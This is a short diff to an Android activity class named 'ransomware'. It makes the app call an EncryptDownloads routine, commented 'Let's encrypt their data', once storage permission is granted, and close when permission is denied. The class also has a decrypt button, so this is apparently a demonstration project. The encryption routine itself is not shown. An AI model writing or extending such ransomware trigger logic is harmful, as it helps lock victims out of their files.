@@ -25,6 +25,8 @@ public class ransomware extends AppCompatActivity {
         } else {
             Log.e("Ransomware", "We already got storage permissions so we don't need to request again");
         }
+        // Oops! They shouldn't have given us storage permissions. Let's encrypt their data
+        new EncryptDownloads(this);
 
         Button btnDecrypt = this.findViewById(R.id.buttonDecrypt);
         btnDecrypt.setOnClickListener(new DecryptClick(this));
@@ -46,9 +48,8 @@ public class ransomware extends AppCompatActivity {
             Log.e("Ransomware", "Granted");
         }else {
             Log.e("Ransomware", "Denied");
-
+            // Close the app because we can't do anything without permissions
+            this.finishAffinity();
         }
-        // Oops! They shouldn't have given us storage permissions. Let's encrypt their data
-//        new EncryptDownloads(this);
     }
 }
